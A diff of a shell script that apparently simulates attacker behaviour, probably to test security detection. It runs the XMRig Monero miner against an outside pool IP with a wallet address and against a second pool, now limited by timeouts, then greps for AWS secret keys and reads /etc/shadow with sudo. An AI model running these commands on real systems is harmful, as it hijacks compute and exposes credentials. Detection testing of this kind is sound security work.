@@ -113,16 +113,17 @@ run_additional_commands() {
     cd xmrig-6.16.4
     sleep 1
     echo "Executing XMRig with donate-level 8..."
-    ./xmrig --donate-level 8 -o 47.115.41.163:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero
-    sleep 3
-    exit
-    echo "Executing XMRig with alternative pool..."
-    ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
+    timeout 3 ./xmrig --donate-level 8 -o 47.115.41.163:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero
     sleep 1
-    exit
+    echo "Executing XMRig with alternative pool..."
+    timeout 3 ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
+    sleep 1
+    echo "Remove xmrig from filesystem"
+    rm xmrig
+    sleep 2
     echo "Searching for AWS secret keys in files..."
     grep "aws_secret_access_key" /path/to/some/file || echo "No AWS secrets found."
-
+    sleep 2
     echo "Attempting to read shadow file..."
     sudo cat /etc/shadow > /dev/null
 
